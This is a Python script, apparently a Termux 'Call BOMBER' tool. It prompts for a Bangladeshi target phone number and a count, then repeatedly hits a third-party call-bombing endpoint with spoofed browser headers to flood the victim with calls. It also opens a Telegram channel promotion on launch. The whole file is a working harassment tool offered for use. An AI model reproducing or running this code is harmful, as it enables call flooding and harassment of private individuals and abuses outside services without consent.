#hello
import os,requests,time
time.sleep(1)
os.system("clear")
os.system("xdg-open https://t.me/termux_tools1")
logo3=("""
\033[1;99m╔════════════════════════════════════════════════════════════════════╗    
\033[1;92m█ \033[0;35m   
\033[38;5;196m    ___    _   ______  _   ____  ____  _______  __  _______
\033[35;1m   /   |  / | / / __ \/ | / /\ \/ /  |/  / __ \/ / / / ___/
\033[36;1m  / /| | /  |/ / / / /  |/ /  \  / /|_/ / / / / / / /\__ \ 
\033[36;1m / ___ |/ /|  / /_/ / /|  /   / / /  / / /_/ / /_/ /___/ / 
\033[34;1m/_/  |_/_/ |_/\____/_/ |_/   /_/_/  /_/\____/\____//____/  
\033[1;94m[+]==========================================================================[+]
\033[1;94m[+]\033[1;32m               CREATED BY   :  Termux-tools(HR)	     \033[1;94m[+]
\033[1;94m[+]\033[1;32m               ON GITHUB    :  9Team10-HR             \033[1;94m[+]
\033[1;94m[+]\033[1;32m               TOOL VERSION :  7.2                    \033[1;94m[+]
\033[1;94m[+]\033[1;32m               NETWORK      :  4G,5G                  \033[1;94m[+]
\033[1;94m[+]\033[1;32m               TOOL STATUS  :  FREE                   \033[1;94m[+]
\033[1;94m[+]\033[1;32m               TOOL'S NAME  :  Call BOMBER             \033[1;94m[+]
\033[1;94m[+]\033[1;32m               COUNTRY      :  BANGLADESH             \033[1;94m[+]
\033[1;94m[+]==========================================================================[+]""")
print(logo3)
num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
amount=int(input("\n  \033[38;5;46mCALL BOMBINg AMOUNT : "))
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://khalid10.xyz/Call-Bomb/ax-callbomb?UserName=6c676aa80961edebdc05b9472c72067a&Request/Call/To/Phone/AX=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
url2="https://khalid10.xyz/Call-Bomb/ax-callbomb?UserName=6c676aa80961edebdc05b9472c72067a&Request/Call/To/Phone/AX=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers2={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses=0
while amount>ses:
  sent1=requests.get(url1,headers=headers1)
  if sent1.status_code==200:
    ses+=1
    print(f"\n{ses}  \033[38;5;46m❤️‍🔥Tearmux tools💞")
  else:
    pass
  
  sent2=requests.get(url2,headers=headers2)
  if sent2.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46m❤️‍🔥Tearmux tools💞")
  else:
    pass
  
  sent3=requests.get(url2,headers=headers2)
  if sent3.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46m❤️‍🔥Termux tools 💞")
  else:
    pass
os.system("clear")
print(""" \033[1;32m
JOIN TELEGRAM 
    t.me/termux_tools1
                     t.me/termux_tools1
                            t.me/termux_tools1
                            t.me/termux_tools1
                            t.me/termux_tools1
                            t.me/termux_tools1
                            t.me/termux_tools1
                            
 JOIN TELEGRAM🖤
""")
